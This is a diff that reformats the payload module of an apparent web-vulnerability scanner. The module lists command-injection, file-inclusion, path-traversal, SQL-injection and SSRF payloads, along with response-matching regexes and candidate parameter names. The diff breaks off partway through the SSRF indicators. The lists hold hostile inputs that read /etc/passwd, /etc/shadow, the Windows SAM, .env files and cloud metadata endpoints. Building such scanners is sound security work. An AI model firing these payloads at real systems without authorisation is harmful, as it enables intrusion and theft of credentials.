@@ -1,138 +1,216 @@
-### COMMAND INJECTION PAYLOADS
+# == COMMAND INJECTION PAYLOADS
 comm_injection_payloads = [
     # Basic command separators
-    "; whoami", "| whoami", "& whoami", "&& whoami",
-    "|| whoami", "`whoami`", "$(whoami)",
-    
+    "; whoami",
+    "| whoami",
+    "& whoami",
+    "&& whoami",
+    "|| whoami",
+    "`whoami`",
+    "$(whoami)",
     # Time-based payloads
-    "; sleep 5", "| sleep 5", "& sleep 5", "&& sleep 5",
-    "|| sleep 5", "`sleep 5`", "$(sleep 5)",
-    
+    "; sleep 5",
+    "| sleep 5",
+    "& sleep 5",
+    "&& sleep 5",
+    "|| sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
     # Directory listing
-    "; ls", "| ls", "& ls", "&& ls",
-    "|| ls", "`ls`", "$(ls)",
-    
+    "; ls",
+    "| ls",
+    "& ls",
+    "&& ls",
+    "|| ls",
+    "`ls`",
+    "$(ls)",
     # Windows equivalents
-    "; dir", "| dir", "& dir", "&& dir",
-    "|| dir", "`dir`", "$(dir)",
-    
+    "; dir",
+    "| dir",
+    "& dir",
+    "&& dir",
+    "|| dir",
+    "`dir`",
+    "$(dir)",
     # Path traversal combined with command injection
-    "../../../bin/ls", "..\\..\\..\\windows\\system32\\cmd.exe",
-    
+    "../../../bin/ls",
+    "..\\..\\..\\windows\\system32\\cmd.exe",
     # URL encoded payloads
-    "%3B%20whoami", "%7C%20whoami", "%26%20whoami", "%26%26%20whoami", "%7C%7C%20whoami",
-    
+    "%3B%20whoami",
+    "%7C%20whoami",
+    "%26%20whoami",
+    "%26%26%20whoami",
+    "%7C%7C%20whoami",
     # Double URL encoded
-    "%253B%2520whoami", "%257C%2520whoami", "%2526%2520whoami",
-    
+    "%253B%2520whoami",
+    "%257C%2520whoami",
+    "%2526%2520whoami",
     # Newline injection
-    "\n whoami", "\r whoami", "\r\n whoami",
-    "%0A whoami", "%0D whoami", "%0D%0A whoami",
-    
+    "\n whoami",
+    "\r whoami",
+    "\r\n whoami",
+    "%0A whoami",
+    "%0D whoami",
+    "%0D%0A whoami",
     # Null byte injection
-    "\x00; whoami", "%00; whoami",
-    
+    "\x00; whoami",
+    "%00; whoami",
     # Alternative command execution
-    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
-    "|| cat /etc/passwd", "`cat /etc/passwd`", "$(cat /etc/passwd)",
-    
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "|| cat /etc/passwd",
+    "`cat /etc/passwd`",
+    "$(cat /etc/passwd)",
     # Windows file access
-    "; type C:\\windows\\system.ini", "| type C:\\windows\\system.ini",
-    "&& type C:\\windows\\system.ini", "|| type C:\\windows\\system.ini",
-    
+    "; type C:\\windows\\system.ini",
+    "| type C:\\windows\\system.ini",
+    "&& type C:\\windows\\system.ini",
+    "|| type C:\\windows\\system.ini",
     # Command chaining with various separators
-    "test; whoami; echo done", "test | whoami | echo done", "test & whoami & echo done",
-    "test && whoami && echo done", "test || whoami || echo done",
-    
+    "test; whoami; echo done",
+    "test | whoami | echo done",
+    "test & whoami & echo done",
+    "test && whoami && echo done",
+    "test || whoami || echo done",
     # Backtick command substitution
-    "test`whoami`test", "test$(whoami)test",
-    
+    "test`whoami`test",
+    "test$(whoami)test",
     # PowerShell injection (Windows)
-    "; powershell -c whoami", "| powershell -c whoami",
-    "&& powershell -c whoami", "|| powershell -c whoami",
+    "; powershell -c whoami",
+    "| powershell -c whoami",
+    "&& powershell -c whoami",
+    "|| powershell -c whoami",
 ]
-        
+
 comm_injection_evidence_patterns = [
     # Unix/Linux user information
     r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)",  # whoami output
-    r"root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd|messagebus|sshd|mysql|nginx|apache",
-    
+    r"root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd|messagebus|sshd|mysql|nginx|apache",  # noqa
     # Directory listings
     r"drwxr-xr-x|drwx------|-rw-r--r--|-rwxr-xr-x",  # ls -la output
     r"total \d+",  # ls total line
     r"bin|etc|usr|var|tmp|home|root|dev|proc|sys",  # Common Unix directories
-    
     # Windows specific
     r"C:\\Windows|C:\\Program Files|C:\\Users",
     r"Volume in drive [A-Z] is",  # dir command output
     r"Directory of [A-Z]:",  # dir command output
     r"<DIR>",  # Windows directory listing
     r"SYSTEM|Administrator|Guest|Everyone",  # Windows users/groups
-    
     # File contents
     r"root:x:0:0:root:/root:/bin/bash",  # /etc/passwd
     r"\[boot loader\]|\[operating systems\]",  # Windows boot.ini
     r"for 16-bit app support",  # Windows system.ini
-    
     # Error messages that might indicate command execution
     r"command not found|No such file or directory",
     r"'[^']*' is not recognized as an internal or external command",
     r"The system cannot find the file specified",
-    
     # Time-based indicators (sleep command)
     r"sleep: invalid time interval",
     r"sleep: missing operand",
-    
     # PowerShell output
     r"PS [A-Z]:\\>",
     r"Windows PowerShell",
 ]
 
 comm_injection_vulnerable_params = [
-    'cmd', 'command', 'exec', 'execute', 'system', 'shell', 'bash', 'sh',
-    'ping', 'host', 'nslookup', 'dig', 'traceroute', 'whois',
-    'file', 'filename', 'path', 'dir', 'directory', 'folder',
-    'url', 'uri', 'link', 'download', 'upload', 'import', 'export',
-    'backup', 'restore', 'compress', 'decompress', 'zip', 'unzip',
-    'log', 'logs', 'debug', 'trace', 'monitor', 'test', 'check',
-    'config', 'settings', 'options', 'params', 'args', 'arguments',
-    'input', 'data', 'value', 'content', 'text', 'message',
+    "cmd",
+    "command",
+    "exec",
+    "execute",
+    "system",
+    "shell",
+    "bash",
+    "sh",
+    "ping",
+    "host",
+    "nslookup",
+    "dig",
+    "traceroute",
+    "whois",
+    "file",
+    "filename",
+    "path",
+    "dir",
+    "directory",
+    "folder",
+    "url",
+    "uri",
+    "link",
+    "download",
+    "upload",
+    "import",
+    "export",
+    "backup",
+    "restore",
+    "compress",
+    "decompress",
+    "zip",
+    "unzip",
+    "log",
+    "logs",
+    "debug",
+    "trace",
+    "monitor",
+    "test",
+    "check",
+    "config",
+    "settings",
+    "options",
+    "params",
+    "args",
+    "arguments",
+    "input",
+    "data",
+    "value",
+    "content",
+    "text",
+    "message",
 ]
 
-### FILE INCLUSION PAYLOADS
+# == FILE INCLUSION PAYLOADS
 file_inclusion_lfi_payloads = [
     # Basic LFI
-    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     # Null byte injection (older systems)
-    "../../../etc/passwd%00", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
-    
+    "../../../etc/passwd%00",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
     # URL encoded
-    "..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
-    
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
     # Double URL encoded
-    "..%252F..%252F..%252Fetc%252Fpasswd", "..%255C..%255C..%255Cwindows%255Csystem32%255Cdrivers%255Cetc%255Chosts",
-    
+    "..%252F..%252F..%252Fetc%252Fpasswd",
+    "..%255C..%255C..%255Cwindows%255Csystem32%255Cdrivers%255Cetc%255Chosts",
     # PHP wrappers
     "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
     "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
     "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
-    
     # Common config files
-    "../../../etc/shadow", "../../../etc/hosts", "../../../etc/hostname", "../../../proc/version",
-    "../../../proc/self/environ", "..\\..\\..\\windows\\system32\\config\\sam",
-    "..\\..\\..\\windows\\system32\\config\\system", "..\\..\\..\\windows\\win.ini",
+    "../../../etc/shadow",
+    "../../../etc/hosts",
+    "../../../etc/hostname",
+    "../../../proc/version",
+    "../../../proc/self/environ",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "..\\..\\..\\windows\\system32\\config\\system",
+    "..\\..\\..\\windows\\win.ini",
     "..\\..\\..\\windows\\system.ini",
-    
     # Application-specific files
-    "../../../var/log/apache2/access.log", "../../../var/log/apache2/error.log",
-    "../../../var/log/nginx/access.log", "../../../var/log/nginx/error.log",
+    "../../../var/log/apache2/access.log",
+    "../../../var/log/apache2/error.log",
+    "../../../var/log/nginx/access.log",
+    "../../../var/log/nginx/error.log",
     "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log",
-    
     # Common web application files
-    "../../../config/database.yml", "../../../config/config.php", "../../../wp-config.php",
-    "../../../application/config/database.php", "..\\..\\..\\web.config", "..\\..\\..\\app\\config\\parameters.yml",
+    "../../../config/database.yml",
+    "../../../config/config.php",
+    "../../../wp-config.php",
+    "../../../application/config/database.php",
+    "..\\..\\..\\web.config",
+    "..\\..\\..\\app\\config\\parameters.yml",
 ]
 
 file_inclusion_rfi_payloads = [
@@ -146,103 +224,190 @@ file_inclusion_rfi_payloads = [
 ]
 
 file_inclusion_lfi_patterns = [
-    r"root:.*:0:0:",  
-    r"# Host Database",  
-    r"# localhost",  
-    r"\[boot loader\]",  
-    r"# For more information about this file", 
-    r"DNS=",  
-    r"Microsoft Windows",  
-    r"Linux version",  
-    r"uid=\d+", 
-    r"gid=\d+", 
-    r"groups=\d+",  
-    r"www-data", 
-    r"nobody",  
-    r"daemon",  
-    r"<\?php", 
-    r"<\?xml", 
-    r"define\(",  
-    r"mysql_connect",  
-    r"mysqli_connect",  
-    r"PDO\(",  
-    r"password.*=.*['\"]", 
-    r"secret.*=.*['\"]",  
-    r"api_key.*=.*['\"]",  
+    r"root:.*:0:0:",
+    r"# Host Database",
+    r"# localhost",
+    r"\[boot loader\]",
+    r"# For more information about this file",
+    r"DNS=",
+    r"Microsoft Windows",
+    r"Linux version",
+    r"uid=\d+",
+    r"gid=\d+",
+    r"groups=\d+",
+    r"www-data",
+    r"nobody",
+    r"daemon",
+    r"<\?php",
+    r"<\?xml",
+    r"define\(",
+    r"mysql_connect",
+    r"mysqli_connect",
+    r"PDO\(",
+    r"password.*=.*['\"]",
+    r"secret.*=.*['\"]",
+    r"api_key.*=.*['\"]",
 ]
 file_inclusion_file_params = [
-    "file", "include", "page", "template", "view", "doc", "document",
-    "path", "show", "dir", "folder", "inc", "locate", "cat", "detail",
-    "content", "read", "get", "lang", "language", "home", "action",
-    "board", "date", "goto", "link", "load", "open", "root", "style",
-    "class", "return", "data", "src", "resource", "load_file", "path_info"
+    "file",
+    "include",
+    "page",
+    "template",
+    "view",
+    "doc",
+    "document",
+    "path",
+    "show",
+    "dir",
+    "folder",
+    "inc",
+    "locate",
+    "cat",
+    "detail",
+    "content",
+    "read",
+    "get",
+    "lang",
+    "language",
+    "home",
+    "action",
+    "board",
+    "date",
+    "goto",
+    "link",
+    "load",
+    "open",
+    "root",
+    "style",
+    "class",
+    "return",
+    "data",
+    "src",
+    "resource",
+    "load_file",
+    "path_info",
 ]
 
-### PATH TRAVERSAL PAYLOADS
+# == PATH TRAVERSAL PAYLOADS
 path_traversal_payloads = [
     # Basic path traversal
-    "../../../", "..\\..\\..\\", "../../../../", "..\\..\\..\\..\\",
-    
+    "../../../",
+    "..\\..\\..\\",
+    "../../../../",
+    "..\\..\\..\\..\\",
     # Encoded payloads
-    "%2e%2e%2f", "%2e%2e%5c", "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
-    
+    "%2e%2e%2f",
+    "%2e%2e%5c",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
+    "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
     # Double encoded
-    "%252e%252e%252f", "%252e%252e%255c", "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
-    
+    "%252e%252e%252f",
+    "%252e%252e%255c",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
     # Unicode encoded
-    "%c0%ae%c0%ae%c0%af", "%c1%9c%c1%9c%c1%af",
-    
+    "%c0%ae%c0%ae%c0%af",
+    "%c1%9c%c1%9c%c1%af",
     # Mixed encoding
-    "..%252f", "..%255c", "%2e%2e/", "%2e%2e\\",
-    
+    "..%252f",
+    "..%255c",
+    "%2e%2e/",
+    "%2e%2e\\",
     # 16-bit Unicode
-    "%u002e%u002e%u002f", "%u002e%u002e%u005c",
-    
+    "%u002e%u002e%u002f",
+    "%u002e%u002e%u005c",
     # Overlong UTF-8
-    "%c0%2e%c0%2e%c0%2f", "%e0%80%ae%e0%80%ae%e0%80%af",
-    
+    "%c0%2e%c0%2e%c0%2f",
+    "%e0%80%ae%e0%80%ae%e0%80%af",
     # Null byte (older systems)
-    "../../../%00", "..\\..\\..\\%00",
-    
+    "../../../%00",
+    "..\\..\\..\\%00",
     # Various combinations
-    "....//", "....\\\\", "..../", "....\\", "....//....//....//",
-    
+    "....//",
+    "....\\\\",
+    "..../",
+    "....\\",
+    "....//....//....//",
     # Filter bypass attempts
-    "...../", ".....\\", "....../", "......\\", "..;/", "..;\\", "..\\/","../\\", "..\\./", "..\\../",
-    
+    "...../",
+    ".....\\",
+    "....../",
+    "......\\",
+    "..;/",
+    "..;\\",
+    "..\\/",
+    "../\\",
+    "..\\./",
+    "..\\../",
     # OS-specific variations
-    "..\\..\\windows\\system32\\", "../../../etc/", "..\\..\\..\\windows\\",
-    "../../../../var/", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\",
-    "../../../../../etc/passwd", "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    
+    "..\\..\\windows\\system32\\",
+    "../../../etc/",
+    "..\\..\\..\\windows\\",
+    "../../../../var/",
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\",
+    "../../../../../etc/passwd",
+    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     # Specific file access attempts
-    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    "../../../etc/shadow", "../../../etc/group", "../../../etc/hostname",
-    "../../../etc/issue", "../../../etc/motd", "../../../etc/apache2/apache2.conf",
-    "../../../etc/nginx/nginx.conf", "../../../proc/version", "../../../proc/meminfo",
-    "../../../proc/cpuinfo", "../../../proc/self/environ", "../../../proc/self/cmdline",
-    "..\\..\\..\\windows\\system32\\config\\sam", "..\\..\\..\\windows\\system32\\config\\system",
-    "..\\..\\..\\windows\\system32\\config\\security", "..\\..\\..\\windows\\win.ini",
-    "..\\..\\..\\windows\\system.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    "..\\..\\..\\inetpub\\wwwroot\\web.config", "..\\..\\..\\boot.ini",
-    
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "../../../etc/shadow",
+    "../../../etc/group",
+    "../../../etc/hostname",
+    "../../../etc/issue",
+    "../../../etc/motd",
+    "../../../etc/apache2/apache2.conf",
+    "../../../etc/nginx/nginx.conf",
+    "../../../proc/version",
+    "../../../proc/meminfo",
+    "../../../proc/cpuinfo",
+    "../../../proc/self/environ",
+    "../../../proc/self/cmdline",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "..\\..\\..\\windows\\system32\\config\\system",
+    "..\\..\\..\\windows\\system32\\config\\security",
+    "..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\windows\\system.ini",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "..\\..\\..\\inetpub\\wwwroot\\web.config",
+    "..\\..\\..\\boot.ini",
     # Web application files
-    "../../../config/database.yml", "../../../config/database.php", "../../../wp-config.php",
-    "../../../.env", "../../../.htaccess", "../../../composer.json", "../../../package.json",
-    "../../../Gemfile", "../../../settings.py", "../../../config.php", "../../../app/config/parameters.yml",
-    "../../../application/config/database.php", "..\\..\\..\\web.config", "..\\..\\..\\global.asax",
+    "../../../config/database.yml",
+    "../../../config/database.php",
+    "../../../wp-config.php",
+    "../../../.env",
+    "../../../.htaccess",
+    "../../../composer.json",
+    "../../../package.json",
+    "../../../Gemfile",
+    "../../../settings.py",
+    "../../../config.php",
+    "../../../app/config/parameters.yml",
+    "../../../application/config/database.php",
+    "..\\..\\..\\web.config",
+    "..\\..\\..\\global.asax",
     "..\\..\\..\\app_data\\",
-    
     # Log files
-    "../../../var/log/apache2/access.log", "../../../var/log/apache2/error.log",
-    "../../../var/log/nginx/access.log", "../../../var/log/nginx/error.log",
-    "../../../var/log/auth.log", "../../../var/log/syslog", "../../../var/log/messages",
-    "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\", "..\\..\\..\\windows\\system32\\logfiles\\httperr\\",
-    
+    "../../../var/log/apache2/access.log",
+    "../../../var/log/apache2/error.log",
+    "../../../var/log/nginx/access.log",
+    "../../../var/log/nginx/error.log",
+    "../../../var/log/auth.log",
+    "../../../var/log/syslog",
+    "../../../var/log/messages",
+    "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\",
+    "..\\..\\..\\windows\\system32\\logfiles\\httperr\\",
     # Interesting directories
-    "../../../home/", "../../../tmp/", "../../../var/tmp/", "../../../var/www/", "../../../usr/local/",
-    "../../../opt/", "..\\..\\..\\users\\", "..\\..\\..\\temp\\", "..\\..\\..\\windows\\temp\\",
-    "..\\..\\..\\inetpub\\wwwroot\\", "..\\..\\..\\program files\\", "..\\..\\..\\program files (x86)\\",
+    "../../../home/",
+    "../../../tmp/",
+    "../../../var/tmp/",
+    "../../../var/www/",
+    "../../../usr/local/",
+    "../../../opt/",
+    "..\\..\\..\\users\\",
+    "..\\..\\..\\temp\\",
+    "..\\..\\..\\windows\\temp\\",
+    "..\\..\\..\\inetpub\\wwwroot\\",
+    "..\\..\\..\\program files\\",
+    "..\\..\\..\\program files (x86)\\",
 ]
 
 path_traversal_detection_patterns = [
@@ -271,7 +436,6 @@ path_traversal_detection_patterns = [
     r"messagebus:.*:",
     r"uuidd:.*:",
     r"dnsmasq:.*:",
-    
     # Windows hosts file
     r"# Copyright \(c\) 1993-\d+ Microsoft Corp\.",
     r"# This is a sample HOSTS file used by Microsoft TCP/IP",
@@ -279,7 +443,6 @@ path_traversal_detection_patterns = [
     r"# localhost name resolution is handled within DNS itself",
     r"127\.0\.0\.1\s+localhost",
     r"::1\s+localhost",
-    
     # Windows system files
     r"\[boot loader\]",
     r"\[operating systems\]",
@@ -292,7 +455,6 @@ path_traversal_detection_patterns = [
     r"MAPI=1",
     r"CMC=1",
     r"MAPIX=1",
-    
     # System information
     r"Linux version \d+\.\d+\.\d+",
     r"gcc version \d+\.\d+\.\d+",
@@ -305,7 +467,6 @@ path_traversal_detection_patterns = [
     r"USERNAME=",
     r"USERPROFILE=",
     r"PROGRAMFILES=",
-    
     # Process information
     r"MemTotal:\s+\d+\s+kB",
     r"MemFree:\s+\d+\s+kB",
@@ -338,7 +499,6 @@ path_traversal_detection_patterns = [
     r"cache_alignment\s+:\s+\d+",
     r"address sizes\s+:\s+\d+ bits physical, \d+ bits virtual",
     r"power management:",
-    
     # Configuration files
     r"define\s*\(\s*['\"]DB_HOST['\"]",
     r"define\s*\(\s*['\"]DB_NAME['\"]",
@@ -356,7 +516,6 @@ path_traversal_detection_patterns = [
     r"api_key\s*[:=]\s*['\"][^'\"]*['\"]",
     r"access_token\s*[:=]\s*['\"][^'\"]*['\"]",
     r"private_key\s*[:=]\s*['\"][^'\"]*['\"]",
-    
     # Web server configs
     r"DocumentRoot\s+",
     r"ServerName\s+",
@@ -380,7 +539,6 @@ path_traversal_detection_patterns = [
     r"access_log\s+",
     r"listen\s+\d+",
     r"server_name\s+",
-    
     # Log file patterns
     r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+-\s+-\s+\[",
     r"GET\s+/.*\s+HTTP/\d\.\d",
@@ -393,7 +551,6 @@ path_traversal_detection_patterns = [
     r"WARN\s+",
     r"DEBUG\s+",
     r"FATAL\s+",
-    
     # Environment variables
     r"PATH=/",
     r"HOME=/",
@@ -409,7 +566,6 @@ path_traversal_detection_patterns = [
     r"SSH_CLIENT=",
     r"SSH_CONNECTION=",
     r"SSH_TTY=",
-    
     # Common file extensions and content
     r"<\?php",
     r"<\?xml",
@@ -435,121 +591,380 @@ path_traversal_detection_patterns = [
 ]
 
 path_traversal_vulnerable_params = [
-    "file", "path", "page", "include", "dir", "folder", "document", "doc",
-    "template", "view", "show", "display", "read", "get", "load", "open",
-    "cat", "type", "name", "filename", "filepath", "pathname", "location",
-    "url", "src", "source", "resource", "content", "data", "info", "detail",
-    "item", "id", "action", "cmd", "command", "exec", "run", "execute",
-    "goto", "redirect", "forward", "next", "prev", "back", "home", "index",
-    "main", "default", "root", "base", "class", "style", "skin", "theme",
-    "lang", "language", "locale", "region", "country", "zone", "area",
-    "section", "module", "component", "widget", "block", "part", "piece",
-    "chunk", "fragment", "segment", "portion", "element", "node", "leaf",
-    "branch", "tree", "structure", "layout", "format", "pattern", "scheme",
-    "config", "setting", "option", "preference", "parameter", "argument",
-    "value", "input", "output", "result", "response", "request", "query",
-    "search", "find", "lookup", "locate", "seek", "fetch", "retrieve",
-    "extract", "parse", "process", "handle", "manage", "control", "admin",
-    "user", "guest", "member", "client", "customer", "visitor", "session",
-    "cookie", "token", "key", "secret", "password", "pass", "pwd", "auth",
-    "login", "logout", "signin", "signout", "register", "signup", "join",
-    "profile", "account", "dashboard", "panel", "console", "interface",
-    "api", "service", "method", "function", "procedure", "routine", "task",
-    "job", "work", "process", "thread", "queue", "stack", "list", "array",
-    "table", "record", "row", "column", "field", "cell", "entry", "item"
+    "file",
+    "path",
+    "page",
+    "include",
+    "dir",
+    "folder",
+    "document",
+    "doc",
+    "template",
+    "view",
+    "show",
+    "display",
+    "read",
+    "get",
+    "load",
+    "open",
+    "cat",
+    "type",
+    "name",
+    "filename",
+    "filepath",
+    "pathname",
+    "location",
+    "url",
+    "src",
+    "source",
+    "resource",
+    "content",
+    "data",
+    "info",
+    "detail",
+    "item",
+    "id",
+    "action",
+    "cmd",
+    "command",
+    "exec",
+    "run",
+    "execute",
+    "goto",
+    "redirect",
+    "forward",
+    "next",
+    "prev",
+    "back",
+    "home",
+    "index",
+    "main",
+    "default",
+    "root",
+    "base",
+    "class",
+    "style",
+    "skin",
+    "theme",
+    "lang",
+    "language",
+    "locale",
+    "region",
+    "country",
+    "zone",
+    "area",
+    "section",
+    "module",
+    "component",
+    "widget",
+    "block",
+    "part",
+    "piece",
+    "chunk",
+    "fragment",
+    "segment",
+    "portion",
+    "element",
+    "node",
+    "leaf",
+    "branch",
+    "tree",
+    "structure",
+    "layout",
+    "format",
+    "pattern",
+    "scheme",
+    "config",
+    "setting",
+    "option",
+    "preference",
+    "parameter",
+    "argument",
+    "value",
+    "input",
+    "output",
+    "result",
+    "response",
+    "request",
+    "query",
+    "search",
+    "find",
+    "lookup",
+    "locate",
+    "seek",
+    "fetch",
+    "retrieve",
+    "extract",
+    "parse",
+    "process",
+    "handle",
+    "manage",
+    "control",
+    "admin",
+    "user",
+    "guest",
+    "member",
+    "client",
+    "customer",
+    "visitor",
+    "session",
+    "cookie",
+    "token",
+    "key",
+    "secret",
+    "password",
+    "pass",
+    "pwd",
+    "auth",
+    "login",
+    "logout",
+    "signin",
+    "signout",
+    "register",
+    "signup",
+    "join",
+    "profile",
+    "account",
+    "dashboard",
+    "panel",
+    "console",
+    "interface",
+    "api",
+    "service",
+    "method",
+    "function",
+    "procedure",
+    "routine",
+    "task",
+    "job",
+    "work",
+    "process",
+    "thread",
+    "queue",
+    "stack",
+    "list",
+    "array",
+    "table",
+    "record",
+    "row",
+    "column",
+    "field",
+    "cell",
+    "entry",
+    "item",
 ]
 
-### SQL INJECTION PAYLOADS
+# == SQL INJECTION PAYLOADS
 sqli_payloads = [
-    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 1=1 --", "' OR 1=1 #",
-    "1' OR '1'='1", "1' OR '1'='1' --", "1' OR '1'='1' #", "1' OR 1=1 --", "1' OR 1=1 #",
-    "') OR ('1'='1", "') OR ('1'='1' --", "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --",
-    "' AND 1=0 UNION SELECT 1,2,3 --", "' AND 1=0 UNION SELECT 1,2,3,4 --", "1' AND SLEEP(5) --",
-    "1' AND SLEEP(5) #", "' WAITFOR DELAY '0:0:5' --"
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "' OR 1=1 --",
+    "' OR 1=1 #",
+    "1' OR '1'='1",
+    "1' OR '1'='1' --",
+    "1' OR '1'='1' #",
+    "1' OR 1=1 --",
+    "1' OR 1=1 #",
+    "') OR ('1'='1",
+    "') OR ('1'='1' --",
+    "' UNION SELECT 1,2,3 --",
+    "' UNION SELECT 1,2,3,4 --",
+    "' AND 1=0 UNION SELECT 1,2,3 --",
+    "' AND 1=0 UNION SELECT 1,2,3,4 --",
+    "1' AND SLEEP(5) --",
+    "1' AND SLEEP(5) #",
+    "' WAITFOR DELAY '0:0:5' --",
 ]
 
 sqli_error_patterns = [
-    "sql syntax", "syntax error", "mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
-    "mysql_query", "pg_query", "sqlite_query", "ORA-01756", "ORA-00933", "SQL Server",
-    "unclosed quotation mark", "unterminated string", "undetermined error",
-    "on line [0-9]+ of .+\\.php", "database error"
+    "sql syntax",
+    "syntax error",
+    "mysql_fetch_array",
+    "mysql_fetch_assoc",
+    "mysql_num_rows",
+    "mysql_query",
+    "pg_query",
+    "sqlite_query",
+    "ORA-01756",
+    "ORA-00933",
+    "SQL Server",
+    "unclosed quotation mark",
+    "unterminated string",
+    "undetermined error",
+    "on line [0-9]+ of .+\\.php",
+    "database error",
 ]
 
-### SSRF PAYLOADS
+# == SSRF PAYLOADS
 ssrf_payloads = [
     # Internal IP addresses
-    "http://127.0.0.1:80", "http://127.0.0.1:22", "http://127.0.0.1:443", "http://127.0.0.1:8080",
-    "http://127.0.0.1:3000", "http://localhost:80", "http://localhost:22",
-    "http://localhost:443", "http://0.0.0.0:80", "http://0:80",
-    
+    "http://127.0.0.1:80",
+    "http://127.0.0.1:22",
+    "http://127.0.0.1:443",
+    "http://127.0.0.1:8080",
+    "http://127.0.0.1:3000",
+    "http://localhost:80",
+    "http://localhost:22",
+    "http://localhost:443",
+    "http://0.0.0.0:80",
+    "http://0:80",
     # Internal network ranges
-    "http://192.168.1.1", "http://192.168.0.1", "http://10.0.0.1", "http://172.16.0.1",
-    
+    "http://192.168.1.1",
+    "http://192.168.0.1",
+    "http://10.0.0.1",
+    "http://172.16.0.1",
     # Cloud metadata services
-    "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/",
-    "http://metadata.google.internal/computeMetadata/v1/instance/", "http://100.100.100.200/latest/meta-data/",
-    
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/",
+    "http://100.100.100.200/latest/meta-data/",
     # Alternative representations
-    "http://2130706433/", "http://0x7f000001/", "http://017700000001/", "http://127.1/",  
-    
+    "http://2130706433/",
+    "http://0x7f000001/",
+    "http://017700000001/",
+    "http://127.1/",
     # File protocol
-    "file:///etc/passwd", "file:///etc/hosts", "file:///proc/version",
-    "file:///windows/win.ini", "file://localhost/etc/passwd",
-    
+    "file:///etc/passwd",
+    "file:///etc/hosts",
+    "file:///proc/version",
+    "file:///windows/win.ini",
+    "file://localhost/etc/passwd",
     # Other protocols
-    "ftp://127.0.0.1/", "gopher://127.0.0.1:70/", "dict://127.0.0.1:2628/", "ldap://127.0.0.1/",
-    
+    "ftp://127.0.0.1/",
+    "gopher://127.0.0.1:70/",
+    "dict://127.0.0.1:2628/",
+    "ldap://127.0.0.1/",
     # URL encoding bypasses
-    "http://127.0.0.1%2F", "http://127.0.0.1%3A80", "http://127%2E0%2E0%2E1",
-    
+    "http://127.0.0.1%2F",
+    "http://127.0.0.1%3A80",
+    "http://127%2E0%2E0%2E1",
     # Unicode bypasses
-    "http://127。0。0。1", "http://127.0.0.1。",
-    
+    "http://127。0。0。1",
+    "http://127.0.0.1。",
     # Domain variations
-    "http://localhost.localdomain", "http://0.0.0.0.nip.io", "http://127.0.0.1.nip.io",
-    
+    "http://localhost.localdomain",
+    "http://0.0.0.0.nip.io",
+    "http://127.0.0.1.nip.io",
     # Other internal services
-    "http://127.0.0.1:6379", "http://127.0.0.1:27017", "http://127.0.0.1:3306", 
-    "http://127.0.0.1:5432", "http://127.0.0.1:11211", "http://127.0.0.1:9200",  
+    "http://127.0.0.1:6379",
+    "http://127.0.0.1:27017",
+    "http://127.0.0.1:3306",
+    "http://127.0.0.1:5432",
+    "http://127.0.0.1:11211",
+    "http://127.0.0.1:9200",
 ]
 
 ssrf_indicators = [
     # File system indicators
-    "root:x:0:0:", "bin:x:1:1:", "daemon:x:2:2:", "# Copyright (c) 1993-2009 Microsoft Corp.",
-    "; for 16-bit app support", "[fonts]",
-    
+    "root:x:0:0:",
+    "bin:x:1:1:",
+    "daemon:x:2:2:",
+    "# Copyright (c) 1993-2009 Microsoft Corp.",
+    "; for 16-bit app support",
+    "[fonts]",
     # Network service indicators
